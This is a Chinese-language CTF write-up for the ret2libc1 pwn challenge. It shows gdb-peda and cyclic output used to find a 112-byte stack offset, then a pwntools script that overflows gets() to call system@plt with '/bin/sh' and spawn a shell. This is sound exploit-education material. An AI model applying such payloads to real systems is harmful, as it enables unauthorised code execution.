> 示例：[https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1)
>
> 参考资料：[https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2libc](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2libc)
>
> [https://www.freebuf.com/news/182894.html](https://www.freebuf.com/news/182894.html)
>

下载下来，检查一下文件保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596611829182-437321d9-af9c-477f-b990-f07b54d7439d.png)

32位程序，开启了NX保护，将文件扔到IDA里：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596611896804-96fc681f-46eb-4b6d-a47c-740c6ea838ef.png)

发现易引起栈溢出的函数，gets，测算栈长度，不再细说，日志如下：

```powershell
root@kali:~/桌面/CTF# cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
root@kali:~/桌面/CTF# gdb ret2libc1
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ret2libc1...done.
gdb-peda$ run
Starting program: /root/桌面/CTF/ret2libc1 
RET2LIBC >_<
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xf7fac5c0 --> 0xfbad2288 
EDX: 0xf7fad89c --> 0x0 
ESI: 0xf7fac000 --> 0x1d9d6c 
EDI: 0xf7fac000 --> 0x1d9d6c 
EBP: 0x62616163 ('caab')
ESP: 0xffffd280 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164
[------------------------------------stack-------------------------------------]
0000| 0xffffd280 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0004| 0xffffd284 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0xffffd288 ("gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0012| 0xffffd28c ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0xffffd290 ("iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0020| 0xffffd294 ("jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0xffffd298 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0028| 0xffffd29c ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62616164 in ?? ()
gdb-peda$ 
[1]+  已停止               gdb ret2libc1
root@kali:~/桌面/CTF# cyclic -l 0x62616164
112
root@kali:~/桌面/CTF# 
```

变量s的栈长度为112

利用工具 ropgadget可以查看是否有 /bin/sh 存在

```powershell
ROPgadget --binary ret2libc1 --string '/bin/sh' 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596612181039-3974c2e4-3e0d-4d00-979d-8d8a32f4637e.png)

当然也可以在IDA里查看

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596612253740-02a51e82-a2a7-4816-9b84-699a132a496c.png)

查找一下是否有 system 函数存在，在secure函数中我们可以找到它

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596612346117-67069f4f-2a20-4a8e-834e-1611a0b511c9.png)

该函数调用了 system() 函数，在程序链接时会为 system() 生成 plt 和 got 项。第一次调用函数时，会把函数真实的地址写入got表中，所以我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。IDA 中找到 system@plt 的地址![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596612346117-67069f4f-2a20-4a8e-834e-1611a0b511c9.png)

那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，**<font style="color:#F5222D;">我们调用的时候会有一个对应的返回地址，这里以 'bbbb' 作为虚假的地址，其后参数对应的参数内容</font>**。

这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596612872306-55decf06-fbfa-4f42-8741-51584913d7df.png)

getshell

